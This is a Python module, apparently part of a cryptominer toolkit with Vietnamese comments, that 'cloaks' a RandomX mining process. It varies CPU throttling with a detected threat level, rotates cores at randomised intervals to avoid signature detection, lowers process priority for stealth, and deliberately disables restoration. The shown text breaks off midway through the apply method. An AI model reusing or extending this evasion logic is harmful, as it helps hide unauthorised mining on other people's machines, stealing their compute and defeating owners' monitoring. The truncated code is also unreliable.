"""
Module cloak_strategies.py - Các chiến lược cloaking cho tiến trình khai thác (đồng bộ).
CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng restoration - chỉ cloaking.
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
from abc import ABC, abstractmethod
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
from pathlib import Path

from .utils import MiningProcess

# ✅ UNIFIED LOGGING: Use centralized logging system
from .unified_logging import get_unified_logger

# ✅ ERROR MANAGEMENT: Use centralized error handling system
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
cloak_logger = get_unified_logger('mining_environment.cloak_strategies')

# ✅ ERROR REPORTER: Get centralized error reporter instance
error_reporter = get_error_reporter()

if TYPE_CHECKING:
    class CPUResourceManager: ...
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    CPUResourceManager = Any  # type: ignore
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                    STRATEGY TYPES & UNIFIED ARCHITECTURE                   #
###############################################################################

class StrategyType:
    """
    ✅ ENHANCED: Các loại chiến lược cloaking cho comprehensive resource control.
    6 active strategies: CPU, GPU (with thermal), Network, Disk I/O, Cache, Memory
    """
    CPU = "cpu"
    GPU = "gpu"
    NETWORK = "network"
    DISK_IO = "disk_io"
    CACHE = "cache"
    MEMORY = "memory"
    THERMAL_CONTROL = "thermal_control"  # ⚠️ DEPRECATED: Unified vào GPU strategy

###############################################################################
#                           CƠ SỞ CỦA CÁC STRATEGY                            #
###############################################################################

class CloakStrategy(ABC):
    """
    ✅ ENHANCED: Lớp cơ sở trừu tượng cho comprehensive multi-strategy cloaking.
    Redesigned cho comprehensive resource cloaking với advanced coordination.
    """

    logger: logging.Logger  # thêm attribute để linter biết
    privileged_manager: Optional[Any] = None  # Để inject privileged operations
    strategy_type: str = ""  # Loại chiến lược (CPU, GPU, Network, ...)
    requires_plugin_system: bool = False  # Có yêu cầu plugin system không
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy: bool = False  # Có phải primary strategy không
    coordination_priority: int = 50  # Priority for multi-strategy coordination (0-100)
    resource_conflicts: List[str] = []  # List of resource types that may conflict
    depends_on_strategies: List[str] = []  # Strategies this one depends on
    
    # ✅ NEW: Performance and compatibility attributes
    supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
    estimated_application_time_ms: int = 100  # Estimated time to apply strategy
    compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies

    def set_privileged_manager(self, privileged_manager: Any) -> None:
        """
        Inject PrivilegedOperationManager vào strategy
        """
        self.privileged_manager = privileged_manager
        if hasattr(self, 'logger'):
            self.logger.debug(f"Injected privileged_manager into {self.__class__.__name__}")

    @abstractmethod
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng chiến lược cloaking cho tiến trình với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
        """
        pass

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).
        CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        
        :param process: Đối tượng MiningProcess.
        :return: None
        """
        self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
        pass

    # ✅ NEW: Comprehensive cloaking support methods
    def pre_apply_check(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
        
        :param process: Đối tượng MiningProcess để check compatibility
        :return: True nếu strategy có thể áp dụng an toàn
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Pre-apply check failed for {self.__class__.__name__}: {e}")
            return False

    def post_apply_verification(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Post-application verification cho comprehensive cloaking.
        
        :param process: Đối tượng MiningProcess để verify
        :return: True nếu strategy đã được áp dụng thành công
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Post-apply verification failed for {self.__class__.__name__}: {e}")
            return False

    def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
        """
        ✅ NEW: Check potential resource conflicts với other strategies.
        
        :param other_strategies: List of strategy names đang được áp dụng
        :return: List of potential conflicts
        """
        conflicts = []
        for strategy in other_strategies:
            if strategy in self.resource_conflicts:
                conflicts.append(strategy)
        return conflicts

    def get_strategy_metadata(self) -> Dict[str, Any]:
        """
        ✅ NEW: Get metadata về strategy cho comprehensive coordination.
        
        :return: Dictionary chứa strategy metadata
        """
        return {
            'strategy_type': self.strategy_type,
            'is_primary': self.is_primary_strategy,
            'priority': self.coordination_priority,
            'conflicts': self.resource_conflicts,
            'dependencies': self.depends_on_strategies,
            'concurrent_safe': self.supports_concurrent_application,
            'estimated_time_ms': self.estimated_application_time_ms,
            'compatibility': self.compatibility_matrix
        }

###############################################################################
#                 CPU STRATEGY: CpuCloakStrategy                              #
###############################################################################

class CpuCloakStrategy(CloakStrategy):
    """
    ✅ ENHANCED: Chiến lược cloaking CPU cho comprehensive multi-strategy environment:
      - Giới hạn CPU bằng cgroup,
      - Tối ưu cache CPU (tuỳ ý),
      - Đặt affinity,
      - Chuyển đổi giữa core chẵn/lẻ theo định kỳ (có thể random hoá khoảng thời gian).
    
    Enhanced cho comprehensive cloaking với advanced coordination.
    """

    strategy_type = StrategyType.CPU
    requires_plugin_system = True  # CPU strategies require plugin system
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = True  # CPU cloaking is PRIMARY for CPU processes
    coordination_priority = 100  # Highest priority for CPU processes
    resource_conflicts = ['memory']  # May conflict with memory strategy on cgroup resources
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 500  # CPU cgroup setup takes ~500ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cpu_resource_manager: CPUResourceManager
    ):
        """
        ✅ ENHANCED: Khởi tạo CpuCloakStrategy với metadata-aware capabilities.
        """
        self.logger = logger
        self.config = config
        self.cpu_resource_manager = cast(Any, cpu_resource_manager)
        
        # ✅ NEW: Type-specific configuration
        self.process_type_config = None

        # Enhanced: Check for advanced stealth capabilities
        self.advanced_stealth_enabled = False
        try:
            # Check if CPU resource manager has stealth capabilities
            if hasattr(cpu_resource_manager, 'stealth_manager') and hasattr(cpu_resource_manager, 'xeon_optimizer'):
                self.advanced_stealth_enabled = True
                self.logger.info("🛡️ [CPU Cloaking] Advanced stealth capabilities detected and enabled")
            else:
                self.logger.info("🔧 [CPU Cloaking] Standard cloaking mode (legacy)")
        except Exception as e:
            self.logger.debug(f"[CPU Cloaking] Stealth capability check failed: {e}")

        # Lưu trữ cgroup name cho từng PID => {"base": "..."}, 
        # để tiện re-throttle, re-affinity v.v.
        self.process_cgroup: Dict[int, Dict[str, str]] = {}

        # Tên tiến trình CPU trong config
        self.allowed_process_name = config.get("processes", {}).get("CPU", "")
        if not self.allowed_process_name:
            self.logger.warning("Không tìm thấy cấu hình tiến trình CPU (key='CPU') trong config.")

        self.dynamic_throttle: bool = bool(config.get('dynamic_throttle', True))  # đảm bảo tồn tại thuộc tính

        # Enhanced: Adaptive throttling based on threat level
        if self.advanced_stealth_enabled:
            self.base_throttle_percentage = config.get('throttle_percentage', 50)  # Lower base for stealth
            self.adaptive_throttling = True
            # Trong chế độ advanced, dynamic_throttle không cần thiết vì đã có adaptive_throttling
            self.dynamic_throttle = False
        else:
            self.throttle_percentage = config.get('throttle_percentage', 70)
            self.adaptive_throttling = False

        if not isinstance(self.base_throttle_percentage if self.advanced_stealth_enabled else self.throttle_percentage, (int, float)):
            self.logger.warning("Giá trị throttle_percentage không hợp lệ, dùng mặc định.")
            if self.advanced_stealth_enabled:
                self.base_throttle_percentage = 50
            else:
                self.throttle_percentage = 70

        # Enhanced: CPU affinity optimization for RandomX
        if self.advanced_stealth_enabled and hasattr(cpu_resource_manager, 'optimal_mining_config'):
            try:
                mining_config = cpu_resource_manager.optimal_mining_config  # type: ignore
                self.optimized_affinity_groups = mining_config.get('cpu_affinity_groups', [])
                self.optimal_thread_count = mining_config.get('threads', 6)
                self.instruction_set = mining_config.get('instruction_set', 'avx2')
                
                self.logger.info(f"🎯 [CPU Cloaking] RandomX optimization: {self.optimal_thread_count} threads, {self.instruction_set}")
                self.logger.info(f"🎯 [CPU Cloaking] Optimized affinity groups: {self.optimized_affinity_groups}")
            except Exception as e:
                self.logger.error(f"[CPU Cloaking] Failed to load RandomX optimization: {e}")
                self.optimized_affinity_groups = []
        else:
            # Fallback to traditional even/odd core switching
            total_cores = psutil.cpu_count(logical=True) or 1
            self.even_cores = [i for i in range(total_cores) if i % 2 == 0]
            self.odd_cores = [i for i in range(total_cores) if i % 2 != 0]
            self.target_cores = self.even_cores  # Mặc định dùng core chẵn

        # Lock để tránh race condition
        self.core_lock = threading.Lock()

        # Enhanced: Signature randomization intervals
        if self.advanced_stealth_enabled:
            self.switch_interval_choices = config.get("stealth_switch_intervals", [
                (180, 300),    # 3 - 5 phút (faster for stealth)
                (300, 450),    # 5 - 7.5 phút
                (450, 600),    # 7.5 - 10 phút
            ])
        else:
            self.switch_interval_choices = config.get("switch_interval_choices", [
                (300, 600),    # 5 - 10 phút
                (600, 1200),   # 10 - 20 phút
                (1200, 1800),  # 20 - 30 phút
                (1800, 3600),  # 30 - 60 phút
                (3600, 7200),  # 60 - 120 phút
            ])

        # Enhanced: Dynamic threat-based throttling
        if self.advanced_stealth_enabled:
            self.adaptive_throttling = True
            threading.Thread(target=self._adaptive_stealth_monitoring, daemon=True).start()
        else:
            # Cấu hình throttle động
            self.dynamic_throttle = config.get('dynamic_throttle', True)
            self.update_interval_choices = config.get('update_interval_choices', [
                (300, 600),    # 5 - 10 phút
                (600, 1200),   # 10 - 20 phút
                (1200, 1800),  # 20 - 30 phút
                (1800, 3600),  # 30 - 60 phút
                (3600, 7200),  # 60 - 120 phút
            ])

        # Khởi tạo luồng cập nhật throttle (nếu dynamic_throttle = True)
        if self.dynamic_throttle:
            threading.Thread(target=self._update_throttle_percentage, daemon=True).start()

        # Khởi tạo luồng chuyển cores
        if self.advanced_stealth_enabled:
            threading.Thread(target=self._adaptive_core_switching, daemon=True).start()
        else:
            threading.Thread(target=self._switch_cores, daemon=True).start()

        # Enhanced: Add system optimization loop
        threading.Thread(target=self._system_health_monitor, daemon=True).start()

        self.logger.info(f"[CPU Cloaking] Initialized - Advanced: {self.advanced_stealth_enabled}")

    def _adaptive_stealth_monitoring(self) -> None:
        """
        Enhanced monitoring với adaptive threat response
        """
        while True:
            try:
                if not self.advanced_stealth_enabled or not hasattr(self.cpu_resource_manager, 'current_threat_level'):
                    time.sleep(30)
                    continue

                # Get current threat level from resource manager
                threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                
                # ------------------------------
                # Giảm mạnh throttle cho cấp LOW
                #  → Cho phép tiến trình CPU sử dụng > 80 % (throttle chỉ 10 %)
                # ------------------------------
                if threat_level == "LOW":
                    new_throttle = 10  # throttle 10 % ⇒ ~90 % CPU
                else:
                    threat_throttle_mapping = {
                        "MEDIUM": self.base_throttle_percentage + random.uniform(10, 20),  # 50-70 %
                        "HIGH": self.base_throttle_percentage + random.uniform(25, 40)     # 70-90 %
                    }
                    new_throttle = max(25, min(90, threat_throttle_mapping.get(threat_level, 50)))
                
                self.logger.info(f"🛡️ [CPU Cloaking] Threat level: {threat_level} → Throttle: {new_throttle:.1f}%")
                
                # Apply new throttling to all managed processes
                with self.core_lock:
                    for pid, info in self.process_cgroup.items():
                        try:
                            if self.cpu_resource_manager and hasattr(self.cpu_resource_manager, '_adapt_throttling_to_threat_level'):
                                self.cpu_resource_manager._adapt_throttling_to_threat_level(pid, threat_level)
                            else:
                                # Fallback to direct throttling
                                self.cpu_resource_manager.throttle_cpu_usage(
                                    pid=pid,
                                    throttle_percentage=new_throttle,
                                    base_cgroup_name=info.get("base"),
                                    cores=self._get_current_target_cores()
                                )
                        except Exception as e:
                            self.logger.error(f"🛡️ [CPU Cloaking] Failed to adapt PID={pid}: {e}")

                # Adaptive sleep based on threat level
                sleep_duration = {
                    "LOW": random.randint(45, 75),      # 45-75 seconds
                    "MEDIUM": random.randint(30, 45),   # 30-45 seconds  
                    "HIGH": random.randint(15, 30)      # 15-30 seconds
                }.get(threat_level, 60)
                
                time.sleep(sleep_duration)

            except Exception as e:
                self.logger.error(f"🛡️ [CPU Cloaking] Adaptive monitoring error: {e}")
                time.sleep(60)

    def _adaptive_core_switching(self):
        """
        Enhanced core switching với RandomX optimization
        """
        while True:
            try:
                # Sleep duration based on stealth intervals
                if self.switch_interval_choices:
                    chosen_range = random.choice(self.switch_interval_choices)
                    sleep_sec = random.randint(chosen_range[0], chosen_range[1])
                    self.logger.info(f"🛡️ [CPU Cloaking] Next core switch in {sleep_sec} seconds (stealth mode)")
                    time.sleep(sleep_sec)
                else:
                    time.sleep(300)  # Fallback

                with self.core_lock:
                    if self.optimized_affinity_groups:
                        # Use RandomX-optimized affinity groups
                        current_group_idx = getattr(self, '_current_group_idx', 0)
                        next_group_idx = (current_group_idx + 1) % len(self.optimized_affinity_groups)
                        
                        self.target_cores = self.optimized_affinity_groups[next_group_idx]
                        self._current_group_idx = next_group_idx
                        
                        self.logger.info(f"🎯 [CPU Cloaking] Switched to optimized group {next_group_idx}: {self.target_cores}")
                    else:
                        # Fallback to even/odd switching
                        if hasattr(self, 'target_cores') and hasattr(self, 'even_cores'):
                            if self.target_cores == self.even_cores:
                                self.target_cores = self.odd_cores
                                self.logger.info("🛡️ [CPU Cloaking] Switched to odd cores")
                            else:
                                self.target_cores = self.even_cores
                                self.logger.info("🛡️ [CPU Cloaking] Switched to even cores")

                    # Update affinity for all managed processes
                    for pid, info in list(self.process_cgroup.items()):
                        try:
                            process = psutil.Process(pid)
                            if process.is_running():
                                # CPU cores managed by cgroup cpuset, not process affinity
                                self.logger.debug(f"🛡️ [CPU Cloaking] Target cores for PID={pid}: {self.target_cores} (via cgroup cpuset)")
                        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                            self.logger.warning(f"🛡️ [CPU Cloaking] Cannot update affinity PID={pid}: {e}")
                            # Remove dead process
                            if pid in self.process_cgroup:
                                del self.process_cgroup[pid]
                        except Exception as e:
                            self.logger.error(f"🛡️ [CPU Cloaking] Error updating affinity PID={pid}: {e}")

            except Exception as e:
                self.logger.error(f"🛡️ [CPU Cloaking] Core switching error: {e}")
                time.sleep(300)

    def _get_current_target_cores(self) -> List[int]:
        """Hàm trợ giúp để lấy target cores hiện tại"""
        with self.core_lock:
            return self.target_cores.copy() if hasattr(self, 'target_cores') else []

    def _update_throttle_percentage(self) -> None:
        """
        Luồng nền cập nhật throttle_percentage động (60–90%),
        rồi gọi throttle_cpu_usage(...) cho mỗi PID đang cloaking.
        """
        while True:
            try:
                # 1) Random throttle 60–90%
                new_throttle = random.uniform(60, 90)
                self.logger.info(f"[CPU Cloaking] Đã cập nhật throttle_percentage: {new_throttle:.2f}%.")
                self.throttle_percentage = new_throttle

                # 2) Re-throttle toàn bộ PID đang cloaking
                # Bọc bằng lock để tránh race với apply/restore/switch_cores
                with self.core_lock:
                    for pid, info in self.process_cgroup.items():
                        base_name = info.get("base")
                        if not base_name:
                            continue
                        try:
                            self.logger.info(
                                f"[CPU Cloaking] Re-throttle PID={pid} => {new_throttle:.2f}% (cgroup={base_name})."
                            )
                            self.cpu_resource_manager.throttle_cpu_usage(
                                pid=pid,
                                throttle_percentage=new_throttle,
                                base_cgroup_name=base_name,
                                cores=self.target_cores
                            )
                        except Exception as e:
                            self.logger.error(f"[CPU Cloaking] Lỗi re-throttle PID={pid}: {e}")

            except Exception as e:
                self.logger.error(f"[CPU Cloaking] Lỗi khi cập nhật throttle_percentage động: {e}")

            # 3) Ngủ ngẫu nhiên theo update_interval_choices
            if self.update_interval_choices:
                chosen_range = random.choice(self.update_interval_choices)
                min_sec, max_sec = chosen_range
                random_sleep_sec = random.randint(min_sec, max_sec)
                self.logger.info(f"[CPU Cloaking] Sẽ ngủ {random_sleep_sec} giây trước lần cập nhật throttle tiếp theo.")
                time.sleep(random_sleep_sec)
            else:
                self.logger.error("[CPU Cloaking] Không có update_interval_choices trong cấu hình!")
                break

    def _switch_cores(self):
        """
        Luồng nền định kỳ: chuyển chẵn <-> lẻ, rồi configure_cpuset + set affinity.
        """
        while True:
            try:
                # 1) Random thời gian
                if self.switch_interval_choices:
                    chosen_range = random.choice(self.switch_interval_choices)
                    sleep_sec = random.randint(chosen_range[0], chosen_range[1])
                    self.logger.info(f"[CPU Cloaking] Sẽ ngủ {sleep_sec} giây trước khi chuyển core (random).")
                    time.sleep(sleep_sec)
                else:
                    self.logger.error("[CPU Cloaking] Không có switch_interval_choices trong cấu hình!")
                    break

                # 2) Bắt đầu chuyển core
                with self.core_lock:
                    if self.target_cores == self.even_cores:
                        self.target_cores = self.odd_cores
                        self.logger.info("[CPU Cloaking] Chuyển sang cores lẻ.")
                    else:
                        self.target_cores = self.even_cores
                        self.logger.info("[CPU Cloaking] Chuyển sang cores chẵn.")

                    # 3) Cập nhật cho tất cả PID đang cloaking
                    for pid, info in list(self.process_cgroup.items()):
                        base_name = info.get("base")
                        if not base_name:
                            continue

                        # Cập nhật cpuset
                        ok_cpuset = self.cpu_resource_manager.configure_cpuset(base_name, self.target_cores)
                        if ok_cpuset:
                            self.logger.info(f"[CPU Cloaking] Đã cập nhật cpuset => {self.target_cores} cho PID={pid}.")
                        else:
                            self.logger.error(f"[CPU Cloaking] Lỗi configure_cpuset PID={pid} cgroup={base_name}.")

                        # Đặt CPU affinity
                        ok_affinity = self.cpu_resource_manager.optimize_thread_scheduling(
                            pid,
                            self.target_cores,
                            base_name
                        )
                        if ok_affinity:
                            self.logger.info(f"[CPU Cloaking] Đã đặt CPU affinity => {self.target_cores} cho PID={pid}.")
                        else:
                            self.logger.error(f"[CPU Cloaking] Không thể đặt affinity cho PID={pid}.")
            except Exception as e:
                self.logger.error(f"[CPU Cloaking] Lỗi trong luồng _switch_cores: {e}")

    def _verify_cgroup_settings(self, base_cgroup_name: str, pid: int) -> bool:
        """
        Enhanced verification với process cleanup và emergency throttling
        """
        try:
            process = psutil.Process(pid)
            
            # 1. Process Health Check & Cleanup
            try:
                status = process.status()
                if status in ['zombie', 'stopped']:
                    self.logger.warning(f"🧟 [Process Cleanup] PID={pid} status: {status} - Attempting cleanup")
                    
                    # Cleanup zombie/stopped process
                    try:
                        if status == 'stopped':
                            process.resume()  # Try to resume first
                            time.sleep(0.1)
                            
                        if process.status() in ['zombie', 'stopped']:
                            process.terminate()
                            time.sleep(0.2)
                            
                            if process.is_running():
                                process.kill()  # Force kill if needed
                                time.sleep(0.1)
                                
                    except (psutil.AccessDenied, psutil.NoSuchProcess):
                        pass
                    
                    # Remove from tracking
                    if pid in self.process_cgroup:
                        del self.process_cgroup[pid]
                        self.logger.info(f"🧹 [Process Cleanup] Removed dead PID={pid} from tracking")
                    
                    return False
                else:
                    self.logger.debug(f"✅ [Process Health] PID={pid} status OK: {status}")
                    
            except Exception as e:
                self.logger.warning(f"[Process Health] Không thể kiểm tra status PID={pid}: {e}")
            
            # 2. Enhanced CPU Usage Monitoring với Emergency Response
            try:
                cpu_percent = process.cpu_percent(interval=0.1)
                
                # Emergency throttling for extreme CPU usage
                if cpu_percent > 800:  # >8 cores full utilization
                    self.logger.error(f"🚨 [Emergency] PID={pid} extreme CPU usage: {cpu_percent:.1f}% - Emergency throttling")
                    
                    # Apply emergency measures
                    try:
                        # Set lowest priority
                        process.nice(19)
                        
                        # Emergency: limit to single core via cgroup cpuset
                        emergency_cores = [0]
                        # CPU cores managed by cgroup cpuset system
                        
                        # Try to reduce threads if possible
                        if hasattr(process, 'num_threads'):
                            thread_count = process.num_threads()
                            if thread_count > 4:
                                self.logger.warning(f"🚨 [Emergency] PID={pid} has {thread_count} threads - High resource usage")
                        
                        self.logger.info(f"🚨 [Emergency] Applied emergency throttling to PID={pid}")
                        
                    except Exception as emergency_e:
                        self.logger.error(f"🚨 [Emergency] Failed emergency throttling PID={pid}: {emergency_e}")
                        
                elif cpu_percent > 400:  # >4 cores
                    self.logger.warning(f"⚠️ [High CPU] PID={pid} using {cpu_percent:.1f}% CPU - Monitoring closely")
                    
                    # Apply intermediate throttling for high CPU usage
                    try:
                        current_nice = process.nice()
                        if current_nice < 15:
                            process.nice(15)
                            self.logger.info(f"⚠️ [High CPU] Increased nice value to 15 for PID={pid}")
                            
                        # Monitor current CPU allocation for high CPU processes
                        current_affinity = process.cpu_affinity()
                        if current_affinity and len(current_affinity) > 2:
                            limited_cores = [0, 1]  # Target: limit to first 2 cores via cgroup
                            self.logger.info(f"⚠️ [High CPU] Should limit PID={pid} to 2 cores: {limited_cores} (via cgroup cpuset)")
                            
                        # Try SIGSTOP/SIGCONT cycling for extreme cases
                        if cpu_percent > 600:  # >6 cores
                            self.logger.warning(f"🛑 [Extreme CPU] PID={pid} using {cpu_percent:.1f}% - Applying pause cycling")
                            try:
                                import signal
                                import os
                                os.kill(pid, signal.SIGSTOP)  # Pause process
                                time.sleep(0.1)  # Brief pause
                                os.kill(pid, signal.SIGCONT)  # Resume process
                                self.logger.info(f"🛑 [Extreme CPU] Applied pause cycling to PID={pid}")
                            except Exception as pause_e:
                                self.logger.debug(f"🛑 [Extreme CPU] Pause cycling failed for PID={pid}: {pause_e}")
                                
                    except Exception as throttle_e:
                        self.logger.error(f"⚠️ [High CPU] Failed intermediate throttling PID={pid}: {throttle_e}")
                    
                elif cpu_percent > 200:  # >2 cores  
                    self.logger.info(f"📊 [CPU Monitor] PID={pid} using {cpu_percent:.1f}% CPU - Normal mining operation")
                else:
                    self.logger.debug(f"📈 [CPU Monitor] PID={pid} using {cpu_percent:.1f}% CPU")
                    
            except Exception as e:
                self.logger.debug(f"[CPU Monitor] Không thể kiểm tra CPU usage PID={pid}: {e}")
            
            # 3. Enhanced Memory Monitoring với Leak Detection
            try:
                memory_info = process.memory_info()
                memory_percent = process.memory_percent()
                
                # Memory leak detection
                if memory_percent > 25:  # >25% RAM usage
                    self.logger.warning(f"🧠 [Memory Alert] PID={pid} high memory usage: {memory_percent:.1f}% ({memory_info.rss // 1024 // 1024} MB)")
                    
                    # Log memory growth trend if possible
                    current_memory_key = f"memory_tracking_{pid}"
                    if hasattr(self, current_memory_key):
                        previous_memory = getattr(self, current_memory_key)
                        growth = memory_info.rss - previous_memory
                        if growth > 100 * 1024 * 1024:  # >100MB growth
                            self.logger.warning(f"🧠 [Memory Growth] PID={pid} memory grew by {growth // 1024 // 1024}MB")
                    
                    setattr(self, current_memory_key, memory_info.rss)
                else:
                    self.logger.debug(f"🧠 [Memory OK] PID={pid} using {memory_percent:.1f}% RAM ({memory_info.rss // 1024 // 1024} MB)")
                    
            except Exception as e:
                self.logger.debug(f"[Memory Monitor] Error checking memory PID={pid}: {e}")
            
            # 4. Process Priority Verification
            try:
                nice_value = process.nice()
                if nice_value <= 0:
                    self.logger.warning(f"⚡ [Priority Alert] PID={pid} has high priority: {nice_value}")
                    # Try to lower priority for stealth
                    try:
                        process.nice(10)  # Set to lower priority
                        self.logger.info(f"⚡ [Priority Fix] Lowered priority for PID={pid}")
                    except:
                        pass
                else:
                    self.logger.debug(f"⚡ [Priority OK] PID={pid} nice value: {nice_value}")
                    
            except Exception as e:
                self.logger.debug(f"[Priority Check] Error for PID={pid}: {e}")
            
            # 5. CPU Affinity Verification với Advanced Stealth
            try:
                cpu_affinity = process.cpu_affinity()
                if not cpu_affinity:
                    self.logger.debug(f"[Affinity Check] PID={pid} has no CPU affinity set")
                    return True
                    
                total_cpus = psutil.cpu_count(logical=True)
                cpu_usage_ratio = len(cpu_affinity) / total_cpus if total_cpus else 1
                
                # Stealth optimization: prefer single core or optimized groups
                if self.advanced_stealth_enabled and hasattr(self, 'optimized_affinity_groups'):
                    current_cores = self._get_current_target_cores()
                    if set(cpu_affinity) != set(current_cores):
                        # Note: Should update cgroup cpuset instead of process affinity
                        self.logger.info(f"🎯 [Stealth Affinity] Target cores for PID={pid}: {current_cores} (managed via cgroup cpuset)")
                else:
                    # Standard stealth: limit to fewer cores
                    if cpu_usage_ratio > 0.5:  # Using >50% of cores
                        # Standard stealth: should limit to fewer cores via cgroup cpuset
                        limited_cores = cpu_affinity[:max(1, len(cpu_affinity) // 2)]
                        self.logger.info(f"🔒 [Stealth Limit] Should reduce PID={pid} to {len(limited_cores)} cores via cgroup cpuset")
                
                self.logger.debug(f"🎯 [Affinity OK] PID={pid} using {len(cpu_affinity)}/{total_cpus} cores: {cpu_affinity}")
                
            except Exception as e:
                self.logger.debug(f"[Affinity Check] Error for PID={pid}: {e}")
            
            # 6. Thread Count Monitoring
            try:
                if hasattr(process, 'num_threads'):
                    thread_count = process.num_threads()
                    if thread_count > 16:  # High thread count
                        self.logger.warning(f"🧵 [Thread Alert] PID={pid} has many threads: {thread_count}")
                    else:
                        self.logger.debug(f"🧵 [Thread OK] PID={pid} threads: {thread_count}")
            except:
                pass
            
            self.logger.debug(f"✅ [Verification Complete] PID={pid} health check passed")
            return True
            
        except psutil.NoSuchProcess:
            self.logger.warning(f"💀 [Process Dead] PID={pid} no longer exists - Removing from tracking")
            if pid in self.process_cgroup:
                del self.process_cgroup[pid]
            return False
        except Exception as e:
            self.logger.error(f"❌ [Verification Error] PID={pid}: {e}")
            return False

    def configure_for_process_type(self, process_type: str, strategy_hints: Dict[str, Any] = None) -> None:
        """
        ✅ NEW: Pre-configure strategy cho specific process type.
        
        :param process_type: 'CPU' hoặc 'GPU' process type.
        :param strategy_hints: Optional optimization hints.
        """
        strategy_hints = strategy_hints or {}
        
        self.process_type_config = {
            'target_type': process_type,
            'stealth_requirements': strategy_hints.get('stealth_requirements', 'medium'),
            'cloaking_aggressiveness': strategy_hints.get('cloaking_aggressiveness', 'moderate'),
            'resource_limits': strategy_hints.get('resource_limits', {}),
            'optimization_level': 'aggressive' if process_type == 'GPU' else 'balanced'
        }
        
        self.logger.info(f"🎯 [CPU Strategy] Pre-configured for {process_type} process type")
        self.logger.debug(f"🔧 [CPU Strategy] Config: {self.process_type_config}")

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng CPU cloaking với metadata-aware optimization và return validation.
        
        :param process: Enhanced MiningProcess với classification metadata.
        :return: bool - True nếu CPU cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            
            # ✅ DIAGNOSTIC: Log logger level và hoạt động
            self.logger.debug(f"[DIAGNOSTIC] CpuCloakStrategy.apply() called for PID={pid}")
            self.logger.debug(f"[DIAGNOSTIC] Logger level: {self.logger.level}")
            self.logger.debug(f"[DIAGNOSTIC] Logger name: {self.logger.name}")
            self.logger.debug(f"[DIAGNOSTIC] Logger handlers: {[h.__class__.__name__ for h in self.logger.handlers]}")
            
            # ✅ EXTRACT METADATA từ enhanced MiningProcess
            process_type = process.get_process_type()
            strategy_hints = process.get_strategy_hints()
            hardware_classification = process.get_hardware_classification()
            
            # ✅ UNIFIED: Detailed strategy logging với unified logger
            self.logger.info(f"🎯 [CPU Strategy] Processing {process_type} process: {name} (PID={pid})")
            self.logger.info(f"📊 [CPU Strategy] Hardware classification: {hardware_classification}")
            self.logger.info(f"💡 [CPU Strategy] Strategy hints: {strategy_hints}")
            
            # ✅ AUTO-CONFIGURE nếu chưa được pre-configured
            if not self.process_type_config:
                self.logger.info(f"⚙️ [CPU Strategy] Auto-configuring for process type: {process_type}")
                self.configure_for_process_type(process_type, strategy_hints)
                self.logger.info(f"✅ [CPU Strategy] Configuration completed for {process_type}")
            
            # ✅ TYPE-SPECIFIC OPTIMIZATION LOGIC
            optimization_level = self.process_type_config.get('optimization_level', 'balanced')
            stealth_level = self.process_type_config.get('stealth_requirements', 'medium')
            
            self.logger.info(f"🚀 [CPU Strategy] Applying {optimization_level} optimization, stealth={stealth_level}")
            self.logger.info(f"🛡️ [CPU Strategy] Starting CPU cloaking operations for PID={pid}")

            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
            if self.allowed_process_name and name != self.allowed_process_name:
                self.logger.debug(
                    f"[CPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên CPU trong config."
                )
                return

            # --- BẰNG LOCK ĐỂ TRÁNH RACE CONDITION ---
            with self.core_lock:
                # EARLY HEALTH CHECK: Check process status BEFORE throttling
                try:
                    process_obj = psutil.Process(pid)
                    status = process_obj.status()
                    
                    if status in ['zombie', 'stopped']:
                        self.logger.warning(f"🧟 [Early Check] PID={pid} status: {status} - Skipping throttling")
                        
                        # Try cleanup but don't proceed with throttling
                        try:
                            if status == 'stopped':
                                process_obj.resume()
                                time.sleep(0.1)
                                
                            if process_obj.status() in ['zombie', 'stopped']:
                                process_obj.terminate()
                                time.sleep(0.2)
                                
                                if process_obj.is_running():
                                    process_obj.kill()
                                    
                        except (psutil.AccessDenied, psutil.NoSuchProcess):
                            pass
                        
                        # Remove from tracking and exit early
                        if pid in self.process_cgroup:
                            del self.process_cgroup[pid]
